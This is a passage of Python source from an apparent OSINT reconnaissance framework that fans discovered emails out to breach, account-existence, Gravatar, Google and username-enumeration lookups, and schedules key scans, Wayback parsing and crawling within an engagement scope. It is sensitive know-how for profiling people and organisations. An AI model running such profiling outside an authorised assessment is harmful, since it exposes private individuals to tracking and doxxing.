        _run_ordered_inprocess_apply_batch(
            reduced_email_values,
            lambda item: _apply_loaded_seed_value_item(
                item,
                loaded_values_out=loaded_emails,
            ),
            progress_label=_derive_apply_progress_label(progress_label),
            progress_callback=progress_callback,
            order_note="loaded-email merge order preserved",
        )
        return loaded_emails

    def _email_localpart_usernames(email_value: str) -> list[str]:
        local = str(email_value or "").split("@", 1)[0].lower().strip()
        if not local:
            return []
        inferred: set[str] = {
            local,
            local.replace(".", ""),
            local.replace(".", "_"),
        }
        first = _re.split(r"[._\-]", local, maxsplit=1)[0]
        if first and len(first) >= 3:
            inferred.add(first)
        return sorted(
            {
                candidate
                for candidate in inferred
                if 3 <= len(candidate) <= 32 and _re.match(r"^[a-zA-Z0-9_.\-]+$", candidate)
            }
        )[:10]

    def _prepare_pending_seed_value(
        seed_value: str,
        *,
        normalize: Callable[[str], str],
    ) -> tuple[str, str] | None:
        raw_seed_value = str(seed_value or "").strip()
        if not raw_seed_value:
            return None
        return raw_seed_value, normalize(raw_seed_value)

    def _normalize_email_seed_value(email_value: str) -> str:
        return str(email_value or "").strip().lower()

    def _prepare_prioritized_seed_value(
        item: tuple[str, int],
        *,
        normalize: Callable[[str], str],
    ) -> tuple[str, int, str] | None:
        raw_seed_value = str(item[0] or "").strip()
        if not raw_seed_value:
            return None
        return raw_seed_value, int(item[1] or 0), normalize(raw_seed_value)

    def _prepare_pending_cloud_target(
        item: tuple[str, str],
        *,
        cloud_commands_map: dict[str, tuple[str, str] | None],
        processed_refs: set[str],
    ) -> dict[str, object]:
        service, ref = item
        key = f"{service}:{ref}"
        command = cloud_commands_map.get(service)
        return {
            "service": service,
            "ref": ref,
            "key": key,
            "group": command[0] if command else "",
            "subcommand": command[1] if command else "",
            "already_processed": key in processed_refs,
        }

    def _prepare_email_fanout_specs(
        item: tuple[str, list[str]],
    ) -> dict[str, object]:
        email, email_inferred_handles = item
        inferred_handles = [
            str(handle or "").strip()
            for handle in email_inferred_handles
            if str(handle or "").strip()
        ]
        email_seed_contexts = [
            _seed_context(email, "email", source="discovered", depth=1, confidence=0.9)
        ]
        dispatch_specs: list[ModuleDispatchSpec] = [
            ModuleDispatchSpec(
                cmd_argv=["osint", "xposed", "--engagement", engagement, "--emails", email],
                label=f"{iteration}.E1 xposed ({email})",
                loop_name="fanout_e_xposed",
                seed_contexts=email_seed_contexts,
                metadata={"iteration": iteration},
            ),
            ModuleDispatchSpec(
                cmd_argv=["osint", "accounts", "--engagement", engagement, "--emails", email],
                label=f"{iteration}.E2 holehe ({email})",
                loop_name="fanout_e_holehe",
                seed_contexts=email_seed_contexts,
                metadata={"iteration": iteration},
            ),
            ModuleDispatchSpec(
                cmd_argv=["osint", "social", "--engagement", engagement, "--emails", email],
                label=f"{iteration}.E3 epieos social ({email})",
                loop_name="fanout_e_social",
                seed_contexts=email_seed_contexts,
                metadata={"iteration": iteration},
            ),
        ]
        identity_lookup_specs: list[ModuleDispatchSpec] = [
            ModuleDispatchSpec(
                cmd_argv=["osint", "gravatar", "--engagement", engagement, "--emails", email],
                label=f"{iteration}.E3.5 gravatar ({email})",
                loop_name="fanout_e_gravatar",
                seed_contexts=email_seed_contexts,
                metadata={"iteration": iteration},
            ),
            ModuleDispatchSpec(
                cmd_argv=["osint", "google", "--engagement", engagement, "--emails", email],
                label=f"{iteration}.E3.7 ghunt google ({email})",
                loop_name="fanout_e_google",
                seed_contexts=email_seed_contexts,
                metadata={"iteration": iteration},
            ),
        ]
        if inferred_handles:
            dispatch_specs.append(
                ModuleDispatchSpec(
                    cmd_argv=[
                        "osint",
                        "usernames",
                        "--engagement",
                        engagement,
                        "--usernames",
                        ",".join(inferred_handles),
                        "--backend",
                        "sherlock",
                    ],
                    label=f"{iteration}.E4 sherlock ({email})",
                    loop_name="fanout_e_sherlock_localpart",
                    seed_contexts=[
                        _seed_context(
                            handle,
                            "username",
                            source="cross_reference",
                            depth=2,
                            confidence=0.72,
                        )
                        for handle in inferred_handles
                    ],
                    metadata={"iteration": iteration, "email_seed": email},
                )
            )
        reputation_spec = ModuleDispatchSpec(
            cmd_argv=["osint", "emailrep", "--engagement", engagement, "--emails", email],
            label=f"{iteration}.E1.5 emailrep ({email})",
            loop_name="fanout_e_emailrep",
            seed_contexts=email_seed_contexts,
            metadata={"iteration": iteration, "rate_limited": True},
        )
        return {
            "email": email,
            "inferred_handles": inferred_handles,
            "dispatch_specs": dispatch_specs,
            "identity_lookup_specs": identity_lookup_specs,
            "reputation_spec": reputation_spec,
        }

    def _prepare_email_chain_result(
        email: str,
        *,
        dispatch_pairs: list[tuple[str, int]],
        reputation_pairs: list[tuple[str, int]],
        inferred_usernames: list[str],
    ) -> dict[str, object]:
        email_returncodes = [
            int(returncode)
            for candidate_email, returncode in dispatch_pairs
            if candidate_email == email
        ]
        email_returncodes.extend(
            int(returncode)
            for candidate_email, returncode in reputation_pairs
            if candidate_email == email
        )
        chain_status = (
            "skipped"
            if dry_run_all
            else "completed"
            if email_returncodes and all(rc == 0 for rc in email_returncodes)
            else "failed"
        )
        return {
            "email": email,
            "returncodes": email_returncodes,
            "chain_status": chain_status,
            "output_count": max(1, len(email_returncodes)),
            "error": None if chain_status != "failed" else "one or more email fan-out modules failed",
            "inferred_usernames": list(inferred_usernames),
            "seed_run_entry": _prepare_one_shot_seed_run_entry(
                seed_value=email,
                seed_type="email",
                loop_name="fanout_e_chain",
                source="discovered",
                depth=1,
                confidence=0.9,
                start_metadata={"iteration": iteration},
                status=chain_status,
                output_count=max(1, len(email_returncodes)),
                error=(
                    None
                    if chain_status != "failed"
                    else "one or more email fan-out modules failed"
                ),
                finish_metadata={
                    "iteration": iteration,
                    "returncodes": email_returncodes,
                    "inferred_usernames": list(inferred_usernames),
                },
            ),
        }

    def _apply_email_chain_result(
        item: dict[str, object],
        *,
        processed_emails_out: set[str],
    ) -> str:
        email = str(item.get("email") or "")
        chain_status = str(item.get("chain_status") or "failed")
        _apply_one_shot_seed_run_entry(
            cast(dict[str, object] | None, item.get("seed_run_entry"))
        )
        if chain_status in {"completed", "skipped"}:
            processed_emails_out.add(email)
        return email

    def _prepare_cloud_ref_batch_item(
        refs_by_service: dict[str, list[str]],
    ) -> list[tuple[str, str]]:
        prepared: list[tuple[str, str]] = []
        seen: set[tuple[str, str]] = set()
        for service, refs in (refs_by_service or {}).items():
            service_name = str(service or "").strip()
            if not service_name:
                continue
            for ref in refs or []:
                normalized_ref = str(ref or "").strip()
                if not normalized_ref:
                    continue
                pair = (service_name, normalized_ref)
                if pair in seen:
                    continue
                seen.add(pair)
                prepared.append(pair)
        return prepared

    def _apply_cloud_target_source_group_item(
        item: list[tuple[str, str]] | None,
        *,
        raw_targets_out: list[tuple[str, str]],
    ) -> int:
        if item is None:
            return 0
        added = 0
        for service_ref in item:
            if len(service_ref) != 2:
                continue
            raw_targets_out.append((str(service_ref[0]), str(service_ref[1])))
            added += 1
        return added

    def _prepare_main_surface_result_entry(
        parsed_result: dict[str, Any],
    ) -> dict[str, object]:
        mined = cast(dict[str, Any], parsed_result.get("mined") or {})
        github_orgs = [
            str(org or "").strip()
            for org in (mined.get("github_orgs", []) or [])
            if str(org or "").strip()
        ]
        crawl_urls = [
            str(url or "").strip()
            for url in (mined.get("crawl_urls", []) or [])
            if str(url or "").strip()
        ]
        passive_urls = [
            str(url or "").strip()
            for url in (parsed_result.get("passive_urls", []) or [])
            if str(url or "").strip()
        ]
        cloud_refs = cast(dict[str, list[str]], parsed_result.get("cloud_refs") or {})
        return {
            "mined": mined,
            "github_orgs": github_orgs,
            "crawl_urls": crawl_urls,
            "passive_urls": passive_urls,
            "cloud_refs": cloud_refs,
        }

    def _apply_main_surface_result_entry(
        item: dict[str, object],
        *,
        mined_out: dict[str, set[str]],
        crawl_urls_out: set[str],
        passive_urls_out: set[str],
        cloud_ref_groups_out: list[dict[str, list[str]]],
        github_orgs_out: set[str],
    ) -> int:
        mined = cast(dict[str, Any], item["mined"])
        _merge_html_mined_result(mined_out, mined)
        crawl_urls_out.update(cast(list[str], item["crawl_urls"]))
        passive_urls_out.update(cast(list[str], item["passive_urls"]))
        cloud_refs = cast(dict[str, list[str]], item["cloud_refs"])
        if cloud_refs:
            cloud_ref_groups_out.append(cloud_refs)
        for org in cast(list[str], item["github_orgs"]):
            github_orgs_out.add(org)
        return len(cloud_refs)

    def _prepare_url_surface_result_entry(
        item: tuple[
            tuple[str, int],
            Any,
            str,
            dict[str, Any],
            list[tuple[str, str]],
        ],
    ) -> dict[str, object]:
        (url_seed, _url_depth), url_handle, payload, parsed_result, prepared_cloud_refs = item
        mined = cast(dict[str, Any], parsed_result.get("mined") or {})
        github_orgs = [
            str(org or "").strip()
            for org in (mined.get("github_orgs", []) or [])
            if str(org or "").strip()
        ]
        metadata_counts = {
            "emails": len(mined.get("emails", []) or []),
            "phones": len(mined.get("phones", []) or []),
            "ips": len(mined.get("ip_seeds", []) or []),
            "hosts": len(mined.get("subdomain_hints", []) or []),
            "profile_urls": len(mined.get("public_profile_urls", []) or []),
            "crawl_urls": len(mined.get("crawl_urls", []) or []),
            "github_orgs": len(github_orgs),
        }
        return {
            "source_url": str(url_seed or "").strip(),
            "url_handle": url_handle,
            "has_payload": bool(payload),
            "mined": mined,
            "prepared_cloud_refs": list(prepared_cloud_refs or []),
            "github_orgs": github_orgs,
            "metadata_counts": metadata_counts,
            "output_count_base": sum(metadata_counts.values()),
        }

    def _apply_url_surface_result_entry(
        item: dict[str, object],
        *,
        batch_mined_out: dict[str, Any],
        cloud_refs_out: dict[str, list[str]],
        github_orgs_out: set[str],
        skip_cloud_value: bool,
    ) -> dict[str, int]:
        has_payload = bool(item["has_payload"])
        mined = cast(dict[str, Any], item["mined"])
        prepared_cloud_refs = cast(list[tuple[str, str]], item["prepared_cloud_refs"])
        metadata_counts = cast(dict[str, int], item["metadata_counts"])
        _merge_html_mined_result(batch_mined_out, mined)
        url_item_cloud_refs = 0
        if not skip_cloud_value and has_payload:
            url_item_cloud_refs = _apply_cloud_ref_group(
                prepared_cloud_refs,
                cloud_refs_out=cloud_refs_out,
            )
        for org in cast(list[str], item["github_orgs"]):
            github_orgs_out.add(org)
        return {
            "cloud_refs_added": url_item_cloud_refs,
            "github_org_hits": int(metadata_counts["github_orgs"]),
        }

    def _prepare_url_surface_finalize_entry(
        item: tuple[dict[str, object], int],
    ) -> dict[str, object] | None:
        prepared_url_surface_entry, url_item_cloud_refs = item
        url_handle = prepared_url_surface_entry.get("url_handle")
        if url_handle is None:
            return None
        metadata_counts = cast(dict[str, int], prepared_url_surface_entry["metadata_counts"])
        return _prepare_module_seed_run_finalization_entry(
            (
                url_handle,
                {"metadata": {"iteration": iteration}},
            ),
            base_metadata_value={},
            status="completed",
            output_count=int(prepared_url_surface_entry["output_count_base"]) + int(url_item_cloud_refs),
            extra_metadata={
                "iteration": iteration,
                "cloud_refs_added": int(url_item_cloud_refs),
                "emails": int(metadata_counts["emails"]),
                "phones": int(metadata_counts["phones"]),
                "ips": int(metadata_counts["ips"]),
                "hosts": int(metadata_counts["hosts"]),
                "profile_urls": int(metadata_counts["profile_urls"]),
                "crawl_urls": int(metadata_counts["crawl_urls"]),
                "github_orgs": int(metadata_counts["github_orgs"]),
            },
        )

    def _apply_url_surface_finalize_entry(
        item: dict[str, object] | None,
    ) -> str | None:
        return _apply_module_seed_run_finalization_entry(item)

    def _extract_wayback_hostname(url_value: str) -> str | None:
        match = _re.match(
            r"https?://([a-zA-Z0-9\-]+(?:\.[a-zA-Z0-9\-]+)+)",
            str(url_value or ""),
        )
        if not match:
            return None
        return match.group(1).lower()

    def _prepare_wayback_host_parse_item(
        item: tuple[int, str],
    ) -> tuple[int, str | None]:
        domain_index, url_value = item
        return (domain_index, _extract_wayback_hostname(url_value))

    def _prepare_wayback_host_parse_input_group(
        item: tuple[int, dict[str, Any]],
    ) -> list[tuple[int, str]]:
        domain_index, result = item
        wb_urls = list((result or {}).get("urls") or [])
        return [
            (int(domain_index), str(url_value or ""))
            for url_value in wb_urls
        ]

    def _apply_wayback_host_parse_input_group(
        item: list[tuple[int, str]] | None,
        *,
        host_parse_items_out: list[tuple[int, str]],
    ) -> int:
        if not item:
            return 0
        host_parse_items_out.extend(item)
        return len(item)

    def _prepare_wayback_host_group_item(
        item: tuple[int, str | None],
    ) -> dict[str, object] | None:
        domain_index, parsed_host = item
        normalized_host = str(parsed_host or "").strip().lower()
        if not normalized_host:
            return None
        return {
            "domain_index": int(domain_index),
            "parsed_host": normalized_host,
        }

    def _apply_wayback_host_group_item(
        item: dict[str, object] | None,
        *,
        host_candidate_groups_out: list[list[Any]],
    ) -> int | None:
        if item is None:
            return None
        domain_index = int(item["domain_index"])
        host_candidate_groups_out[domain_index].append(str(item["parsed_host"]))
        return domain_index

    def _prepare_keyscan_target(
        target: str,
        *,
        engagement_value: str,
        processed_targets: set[str],
        dry_run_keyscan_value: bool,
    ) -> dict[str, object]:
        keyscan_args = [
            "osint",
            "keyscan",
            "--engagement",
            engagement_value,
            "--domain",
            target,
            "--no-validate",
        ]
        if dry_run_keyscan_value:
            keyscan_args.append("--dry-run")
        return {
            "target": target,
            "already_processed": target in processed_targets,
            "seed_type": "domain" if "." in target else "other",
            "cmd_argv": keyscan_args,
        }

    def _prepare_passive_domain_schedule_reduction(
        item: dict[str, object],
    ) -> dict[str, object]:
        root_domain = str(item.get("root_domain") or "")
        skip_logs: list[tuple[str, str]] = []
        if bool(item.get("skip_b")):
            skip_logs.append(
                (
                    f"{iteration}.B harvest ({root_domain})",
                    "[dim]resume skip — already completed for this engagement[/dim]",
                )
            )
        if iteration == 1 and bool(item.get("skip_b2")):
            skip_logs.append(
                (
                    f"{iteration}.B2 crosslinked ({root_domain})",
                    "[dim]resume skip — already completed for this engagement[/dim]",
                )
            )
        return {
            "skip_logs": skip_logs,
            "dispatch_specs": list(item.get("dispatch_specs") or []),
        }

    def _apply_passive_domain_schedule_reduction_item(
        item: dict[str, object],
        *,
        dispatch_specs_out: list[ModuleDispatchSpec],
    ) -> int:
        skip_logs = cast(list[tuple[str, str]], item.get("skip_logs") or [])
        for log_label, log_message in skip_logs:
            _log(log_label, log_message)
        dispatch_specs = cast(list[ModuleDispatchSpec], item.get("dispatch_specs") or [])
        dispatch_specs_out.extend(dispatch_specs)
        return len(dispatch_specs)

    def _prepare_url_seed_schedule_reduction(
        item: dict[str, object],
    ) -> dict[str, object]:
        seed_value = str(item.get("seed_value") or "")
        seed_depth = int(item.get("seed_depth") or 0)
        schedule_entry = (seed_value, seed_depth)
        return {
            "shallow_entry": schedule_entry if bool(item.get("is_shallow")) else None,
            "deeper_entry": schedule_entry if not bool(item.get("is_shallow")) else None,
        }

    def _prepare_username_schedule_reduction(
        item: dict[str, object],
    ) -> dict[str, object]:
        seed_value = str(item.get("seed_value") or "")
        return {
            "shallow_entry": seed_value if bool(item.get("is_shallow")) else None,
            "deeper_entry": seed_value if not bool(item.get("is_shallow")) else None,
        }

    def _prepare_cloud_pending_schedule_reduction(
        item: dict[str, object],
    ) -> dict[str, object]:
        service = str(item.get("service") or "")
        ref = str(item.get("ref") or "")
        return {
            "skip_log": (
                (
                    f"{iteration}.J cloud {service} ({ref})",
                    "[dim]resume skip — already completed for this engagement[/dim]",
                )
                if bool(item.get("already_processed"))
                else None
            ),
            "pending_target": item.get("pending_target"),
        }

    def _apply_cloud_pending_schedule_reduction_item(
        item: dict[str, object],
        *,
        pending_targets_out: list[dict[str, Any]],
    ) -> str | None:
        skip_log = cast(tuple[str, str] | None, item.get("skip_log"))
        if skip_log is not None:
            _log(skip_log[0], skip_log[1])
            return None
        pending_target = cast(dict[str, Any] | None, item.get("pending_target"))
        if pending_target is None:
            return None
        pending_targets_out.append(pending_target)
        return str(pending_target.get("key") or "")

    def _prepare_email_schedule_reduction(
        item: dict[str, object],
    ) -> dict[str, object]:
        email = str(item.get("email") or "")
        dispatch_specs = list(item.get("dispatch_specs") or [])
        identity_lookup_specs = list(item.get("identity_lookup_specs") or [])
        return {
            "email": email,
            "inferred_handles": list(item.get("inferred_handles") or []),
            "dispatch_specs": dispatch_specs,
            "dispatch_spec_emails": [email] * len(dispatch_specs),
            "identity_lookup_specs": identity_lookup_specs,
            "identity_lookup_spec_emails": [email] * len(identity_lookup_specs),
            "reputation_spec": item.get("reputation_spec"),
        }

    def _prepare_email_schedule_aggregation_item(
        item: dict[str, object],
    ) -> dict[str, object]:
        email = str(item.get("email") or "")
        dispatch_specs = [
            cast(ModuleDispatchSpec, spec)
            for spec in list(item.get("dispatch_specs") or [])
            if spec is not None
        ]
        identity_lookup_specs = [
            cast(ModuleDispatchSpec, spec)
            for spec in list(item.get("identity_lookup_specs") or [])
            if spec is not None
        ]
        return {
            "email": email,
            "inferred_handles": [
                str(handle or "").strip()
                for handle in list(item.get("inferred_handles") or [])
                if str(handle or "").strip()
            ],
            "dispatch_specs": dispatch_specs,
            "dispatch_spec_emails": [email] * len(dispatch_specs),
            "identity_lookup_specs": identity_lookup_specs,
            "identity_lookup_spec_emails": [email] * len(identity_lookup_specs),
            "reputation_spec": item.get("reputation_spec"),
        }

    def _prepare_email_localpart_promotion_item(
        item: dict[str, object],
    ) -> dict[str, object] | None:
        email = str(item.get("email") or "").strip()
        inferred_handles = [
            str(handle or "").strip()
            for handle in list(item.get("inferred_handles") or [])
            if str(handle or "").strip()
        ]
        if not email or not inferred_handles:
            return None
        return {
            "email": email,
            "inferred_handles": inferred_handles,
        }

    def _apply_email_schedule_aggregation_item(
        item: dict[str, object],
        *,
        dispatch_specs_out: list[ModuleDispatchSpec],
        dispatch_spec_emails_out: list[str],
        identity_lookup_specs_out: list[ModuleDispatchSpec],
        identity_lookup_spec_emails_out: list[str],
        reputation_specs_out: list[ModuleDispatchSpec],
        reputation_spec_emails_out: list[str],
    ) -> str:
        email = str(item.get("email") or "")
        dispatch_specs = [
            cast(ModuleDispatchSpec, spec)
            for spec in list(item.get("dispatch_specs") or [])
            if spec is not None
        ]
        dispatch_specs_out.extend(dispatch_specs)
        dispatch_spec_emails_out.extend(cast(list[str], item.get("dispatch_spec_emails") or []))
        identity_lookup_specs = [
            cast(ModuleDispatchSpec, spec)
            for spec in list(item.get("identity_lookup_specs") or [])
            if spec is not None
        ]
        identity_lookup_specs_out.extend(identity_lookup_specs)
        identity_lookup_spec_emails_out.extend(
            cast(list[str], item.get("identity_lookup_spec_emails") or [])
        )
        reputation_spec = cast(ModuleDispatchSpec | None, item.get("reputation_spec"))
        if reputation_spec is not None:
            reputation_specs_out.append(reputation_spec)
            reputation_spec_emails_out.append(email)
        return email

    def _apply_email_localpart_promotion(
        item: dict[str, object] | None,
        *,
        db_path_value: str,
    ) -> dict[str, object] | None:
        if item is None:
            return None
        email = str(item.get("email") or "").strip()
        inferred_handles = [
            str(handle or "").strip()
            for handle in list(item.get("inferred_handles") or [])
            if str(handle or "").strip()
        ]
        if not email or not inferred_handles:
            return None
        con = _sq.connect(db_path_value)
        try:
            _promote_email_localpart_seed_refs(con, email, inferred_handles)
            con.commit()
        finally:
            con.close()
        return {
            "email": email,
            "inferred_handles": inferred_handles,
        }

    def _apply_email_localpart_result_merge(
        item: dict[str, object] | None,
        *,
        inferred_by_email_out: dict[str, list[str]],
        inferred_handles_out: set[str],
    ) -> str | None:
        if item is None:
            return None
        email = str(item.get("email") or "").strip()
        if not email:
            return None
        email_inferred_handles = [
            str(handle or "").strip()
            for handle in list(item.get("inferred_handles") or [])
            if str(handle or "").strip()
        ]
        inferred_by_email_out[email] = email_inferred_handles
        inferred_handles_out.update(email_inferred_handles)
        return email

    def _apply_ip_batch_reduction_item(
        item: dict[str, object] | None,
        *,
        pending_entries_out: list[tuple[str, str]],
        seen_ip_values_out: set[str],
    ) -> str | None:
        if item is None:
            return None
        normalized_ip = str(item.get("normalized_ip") or "").strip()
        pending_entry = cast(tuple[str, str] | None, item.get("pending_entry"))
        if not normalized_ip or pending_entry is None or normalized_ip in seen_ip_values_out:
            return None
        seen_ip_values_out.add(normalized_ip)
        pending_entries_out.append(pending_entry)
        return normalized_ip

    def _apply_indexed_pair_item(
        item: tuple[int, Any],
        *,
        leading_values: Sequence[Any],
        pair_items_out: list[tuple[Any, Any]],
    ) -> int | None:
        index, trailing_value = item
        normalized_index = int(index or 0)
        if normalized_index < 0 or normalized_index >= len(leading_values):
            return None
        pair_items_out.append((leading_values[normalized_index], trailing_value))
        return normalized_index

    def _apply_indexed_wayback_result_source_item(
        item: tuple[int, Any],
        *,
        domains: Sequence[str],
        handles: Sequence[Any],
        host_candidate_groups: Sequence[list[Any]],
        result_sources_out: list[tuple[str, Any, Any, list[Any]]],
    ) -> int | None:
        index, wayback_result = item
        normalized_index = int(index or 0)
        if (
            normalized_index < 0
            or normalized_index >= len(domains)
            or normalized_index >= len(handles)
            or normalized_index >= len(host_candidate_groups)
        ):
            return None
        result_sources_out.append(
            (
                domains[normalized_index],
                handles[normalized_index],
                wayback_result,
                host_candidate_groups[normalized_index],
            )
        )
        return normalized_index

    def _apply_indexed_url_surface_result_item(
        item: tuple[int, Any],
        *,
        url_seed_rows: Sequence[tuple[str, int]],
        url_handles: Sequence[Any],
        payloads: Sequence[Any],
        cloud_ref_groups: Sequence[list[tuple[str, str]]],
        result_items_out: list[
            tuple[
                tuple[str, int],
                Any,
                Any,
                Any,
                list[tuple[str, str]],
            ]
        ],
    ) -> int | None:
        index, parsed_result = item
        normalized_index = int(index or 0)
        if (
            normalized_index < 0
            or normalized_index >= len(url_seed_rows)
            or normalized_index >= len(url_handles)
            or normalized_index >= len(payloads)
            or normalized_index >= len(cloud_ref_groups)
        ):
            return None
        result_items_out.append(
            (
                url_seed_rows[normalized_index],
                url_handles[normalized_index],
                payloads[normalized_index],
                parsed_result,
                cloud_ref_groups[normalized_index],
            )
        )
        return normalized_index

    def _apply_int_total_item(
        item: Any,
        *,
        total_out: list[int],
    ) -> int:
        normalized_value = int(item or 0)
        total_out[0] += normalized_value
        return normalized_value

    def _apply_url_surface_result_total_item(
        item: dict[str, object] | None,
        *,
        cloud_ref_counts_out: list[int],
        github_org_hits_total_out: list[int],
    ) -> int:
        if item is None:
            return 0
        cloud_refs_added = int(item.get("cloud_refs_added") or 0)
        github_org_hits_total_out[0] += int(item.get("github_org_hits") or 0)
        cloud_ref_counts_out.append(cloud_refs_added)
        return cloud_refs_added

    def _apply_artifact_queue_total_item(
        item: Any,
        *,
        queued_total_out: list[int],
        halted_out: list[bool],
    ) -> int:
        normalized_value = int(item or 0)
        if normalized_value < 0:
            halted_out[0] = True
            return normalized_value
        if not halted_out[0]:
            queued_total_out[0] += normalized_value
        return normalized_value

    def _apply_resolved_hostname_map_item(
        item: dict[str, object] | None,
        *,
        resolved_map_out: dict[str, dict[str, object]],
    ) -> str | None:
        if item is None:
            return None
        hostname = str(item.get("hostname") or "").strip().lower()
        if not hostname:
            return None
        resolved_map_out[hostname] = item
        return hostname

    def _apply_keyscan_org_batch_item(
        item: str | None,
        *,
        keyscan_targets_out: list[str],
    ) -> str | None:
        org = str(item or "").strip()
        if not org:
            return None
        keyscan_targets_out.append(org)
        return org

    def _prepare_processed_set_item(
        item: str,
        *,
        normalizer: Callable[[str], str],
    ) -> str | None:
        normalized_value = str(normalizer(str(item or "")) or "").strip()
        return normalized_value or None

    def _apply_processed_set_item(
        item: str | None,
        *,
        processed_set: set[str],
    ) -> str | None:
        if item is None:
            return None
        processed_set.add(item)
        return item

    def _apply_cloud_ref_group(
        item: list[tuple[str, str]] | None,
        *,
        cloud_refs_out: dict[str, list[str]],
    ) -> int:
        if item is None:
            return 0
        added_count = 0
        for service, ref in item:
            if ref not in cloud_refs_out[service]:
                cloud_refs_out[service].append(ref)
                added_count += 1
        return added_count

    def _apply_cloud_spec_reduction_item(
        item: ModuleDispatchSpec | None,
        *,
        specs_out: list[ModuleDispatchSpec],
    ) -> str | None:
        if item is None:
            return None
        specs_out.append(item)
        return str(item.label)

    def _prepare_simple_schedule_reduction_entry(
        item: Any,
    ) -> str | None:
        value = str(item or "").strip()
        return value or None

    def _prepare_simple_batch_reduction_entry(
        item: Any,
    ) -> str | None:
        return _prepare_simple_schedule_reduction_entry(item)

    def _prepare_ip_schedule_reduction(
        item: dict[str, object],
    ) -> dict[str, object]:
        normalized_ip = str(item.get("normalized_ip") or "").strip()
        pending_entry = cast(tuple[str, str] | None, item.get("pending_entry"))
        return {
            "normalized_ip": normalized_ip,
            "pending_entry": pending_entry if normalized_ip and pending_entry is not None else None,
        }

    def _prepare_url_seed_scope_item(
        item: tuple[str, int],
    ) -> dict[str, object]:
        seed_value = str(item[0] or "")
        decision = _url_seed_scope_decision(seed_value)
        return {
            "pending_row": item if bool(decision.get("allowed")) else None,
            "denied_url": seed_value if decision.get("reason") == "scope_manifest_denied" else "",
            "deny_reason": str(decision.get("reason") or ""),
            "deny_hostname": str(decision.get("hostname") or ""),
        }

    def _prepare_url_seed_scope_reduction(
        item: dict[str, object],
    ) -> tuple[str, int] | None:
        pending_row = cast(tuple[str, int] | None, item.get("pending_row"))
        return pending_row

    def _prepare_cloud_spec_reduction(
        spec: ModuleDispatchSpec | None,
    ) -> ModuleDispatchSpec | None:
        return spec

    def _prepare_keyscan_schedule_reduction(
        item: dict[str, object],
    ) -> dict[str, object]:
        return {
            "skip_log": (
                (
                    f"{iteration}.F keyscan ({str(item.get('target') or '')})",
                    "[dim]resume skip — already completed for this engagement[/dim]",
                )
                if bool(item.get("already_processed"))
                else None
            ),
            "target": str(item.get("target") or ""),
            "spec": item.get("spec"),
        }

    def _prepare_keyscan_schedule_aggregation_item(
        item: dict[str, object],
    ) -> dict[str, object]:
        return {
            "skip_log": cast(tuple[str, str] | None, item.get("skip_log")),
            "target": str(item.get("target") or "").strip(),
            "spec": cast(ModuleDispatchSpec | None, item.get("spec")),
        }

    def _prepare_keyscan_target_reduction_item(
        item: dict[str, object],
    ) -> dict[str, object] | None:
        target = str(item.get("target") or "").strip()
        if not target:
            return None
        return {
            "target": target,
            "already_processed": bool(item.get("already_processed")),
            "seed_type": str(item.get("seed_type") or "").strip(),
            "cmd_argv": list(item.get("cmd_argv") or []),
        }

    def _prepare_keyscan_target_dedupe_item(
        item: dict[str, object] | None,
    ) -> dict[str, object] | None:
        if item is None:
            return None
        target = str(item.get("target") or "").strip()
        if not target:
            return None
        return {
            "target": target,
            "item": item,
        }

    def _apply_keyscan_target_dedupe_item(
        item: dict[str, object] | None,
        *,
        seen_targets: set[str],
    ) -> dict[str, object] | None:
        if item is None:
            return None
        target = str(item.get("target") or "").strip()
        if not target or target in seen_targets:
            return None
        seen_targets.add(target)
        return cast(dict[str, object] | None, item.get("item"))

    def _apply_keyscan_target_collection_item(
        item: dict[str, object] | None,
        *,
        unique_targets_out: list[dict[str, object]],
    ) -> str | None:
        if item is None:
            return None
        target = str(item.get("target") or "").strip()
        if not target:
            return None
        unique_targets_out.append(item)
        return target

    def _apply_present_batch_item(
        item: Any,
        *,
        batch_out: list[Any],
    ) -> str | None:
        if item is None:
            return None
        batch_out.append(item)
        return str(item)

    def _apply_simple_limited_batch_item(
        item: Any,
        *,
        batch_out: list[str],
        limit: int,
    ) -> str | None:
        if item is None:
            return None
        if len(batch_out) >= max(0, int(limit)):
            return None
        value = str(item or "").strip()
        if not value:
            return None
        batch_out.append(value)
        return value

    def _apply_prioritized_batch_entry_item(
        item: dict[str, object] | None,
        *,
        shallow_entries_out: list[Any],
        deeper_entries_out: list[Any],
    ) -> str | None:
        if item is None:
            return None
        priority = str(item.get("priority") or "").strip()
        entry = item.get("entry")
        if entry is None:
            return None
        if priority == "shallow":
            shallow_entries_out.append(entry)
            return "shallow"
        if priority == "deeper":
            deeper_entries_out.append(entry)
            return "deeper"
        return None

    def _apply_keyscan_schedule_aggregation_item(
        item: dict[str, object],
        *,
        keyscan_specs_out: list[ModuleDispatchSpec],
        scheduled_targets_out: list[str],
    ) -> str | None:
        skip_log = cast(tuple[str, str] | None, item.get("skip_log"))
        if skip_log is not None:
            _log(skip_log[0], skip_log[1])
            return None
        spec = cast(ModuleDispatchSpec | None, item.get("spec"))
        target = str(item.get("target") or "").strip()
        if spec is None or not target:
            return None
        keyscan_specs_out.append(spec)
        scheduled_targets_out.append(target)
        return target

    def _prepare_prioritized_batch_entry(
        item: dict[str, object],
    ) -> dict[str, object] | None:
        shallow_entry = item.get("shallow_entry")
        if shallow_entry is not None:
            return {"priority": "shallow", "entry": shallow_entry}
        deeper_entry = item.get("deeper_entry")
        if deeper_entry is not None:
            return {"priority": "deeper", "entry": deeper_entry}
        return None

    def _prepare_ip_batch_reduction_item(
        item: dict[str, object],
    ) -> dict[str, object] | None:
        normalized_ip = str(item.get("normalized_ip") or "").strip()
        pending_entry = cast(tuple[str, str] | None, item.get("pending_entry"))
        if not normalized_ip or pending_entry is None:
            return None
        return {
            "normalized_ip": normalized_ip,
            "pending_entry": pending_entry,
        }

    def _derive_reduction_progress_label(progress_label: str | None) -> str | None:
        if not progress_label:
            return None
        if progress_label.endswith(" prep"):
            return f"{progress_label[:-5]} reduction"
        if progress_label.endswith(" parse"):
            return f"{progress_label[:-6]} reduction"
        return f"{progress_label} reduction"

    def _derive_resolution_progress_label(progress_label: str | None) -> str | None:
        if not progress_label:
            return None
        if progress_label.endswith(" prep"):
            return f"{progress_label[:-5]} resolve"
        if progress_label.endswith(" parse"):
            return f"{progress_label[:-6]} resolve"
        if progress_label.endswith(" reduction"):
            return f"{progress_label[:-10]} resolve"
        return f"{progress_label} resolve"

    def _derive_apply_progress_label(progress_label: str | None) -> str | None:
        if not progress_label:
            return None
        if progress_label.endswith(" prep"):
            return f"{progress_label[:-5]} apply"
        if progress_label.endswith(" parse"):
            return f"{progress_label[:-6]} apply"
